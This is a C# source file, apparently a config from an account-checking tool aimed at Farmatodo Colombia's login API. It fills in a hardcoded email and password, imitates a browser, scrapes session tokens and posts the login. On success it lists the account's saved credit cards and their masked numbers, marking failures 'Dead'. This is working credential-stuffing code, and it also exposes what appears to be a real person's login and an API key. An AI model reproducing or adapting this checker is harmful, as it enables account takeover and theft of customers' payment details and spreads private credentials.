using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Fox.Configs
{
    internal class FarmatodoColombia
    {

        public static void farma()
        {
            string email = "angelik.mag@gmail.com";
            string pass = "37551404";
            using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
            {
                req.IgnoreProtocolErrors = true;
                string send_data = req.Get("https://www.farmatodo.com.co/", null).ToString();

                var deparmentId = Fuctions.Parsing.LR(send_data, "deparmentId=0&a;token=", "&", false, false);
                string access_tokena = string.Join(", ", deparmentId);

                var tokenIdWebSafe = Fuctions.Parsing.LR(send_data, "tokenIdWebSafe=", "&", false, false);
                string tokenIdWebSafew = string.Join(", ", tokenIdWebSafe);
                /*====================auth==================*/
                req.IgnoreProtocolErrors = true;
                req.AddHeader("Host", "gw-backend.farmatodo.com");
                req.AddHeader("Connection", "keep-alive");
                req.AddHeader("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"");
                req.AddHeader("sec-ch-ua-mobile", "?0");
                req.AddHeader("source", "WEB");
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36";
                req.AddHeader("Content-Type", "application/json");
                req.AddHeader("Accept", "application/json, text/plain, */*");
                req.AddHeader("country", "COL");
                req.AddHeader("finalCountry", "Colombi");
                req.AddHeader("sec-ch-ua-platform", "\"Windows\"");
                req.AddHeader("Origin", "https://www.farmatodo.com.co");
                req.AddHeader("Sec-Fetch-Site", "cross-site");
                req.AddHeader("Sec-Fetch-Mode", "cors");
                req.Referer = "https://www.farmatodo.com.co/";
                req.AddHeader("Accept-Language", "en-US,en;q=0.9,es;q=0.8");
                req.AddHeader("Accept-Encoding", "gzip, deflate");
                string payload = "{\"keyClient\":12345,\"latitude\":4.681924599999999,\"longitude\":-74.0438379,\"emailAddress\":\"" + email + "\",\"password\":\"" + pass + "\"}";
                send_data = req.Post("https://gw-backend.farmatodo.com/_ah/api/customerEndpoint/loginPost?token=" + access_tokena + "&tokenIdWebSafe=" + tokenIdWebSafew + "&key=AIzaSyAidR6Tt0K60gACR78aWThMQb7L5u6Wpag", payload, "application/json").ToString();
                if (send_data.Contains("idCustomerWebSafe"))
                {
                    string palabraBuscada = "creditCardId";

                    int count = new Regex(palabraBuscada, RegexOptions.Compiled | RegexOptions.IgnoreCase)
                        .Matches(send_data)
                        .Count;
                    var Credit = Fuctions.Parsing.JSON(send_data, "maskedNumber", true, false);
                    string status2 = string.Join(", ", Credit);
                    string capture = " + " + email + ":" + pass + " | Cards = " + count + " | CardsMasked = " + status2;
                    Console.WriteLine(capture);





                }
                else if (send_data.Contains("Contraseña incorrecta, por favor inténtalo nuevamente") | send_data.Contains("Estimado usuario, si es primera vez que usa esta aplicación deberá registrarse de nuevo si no valide su correo"))
                {
                    Console.WriteLine("Dead");


                }
            }
        }
    }
}
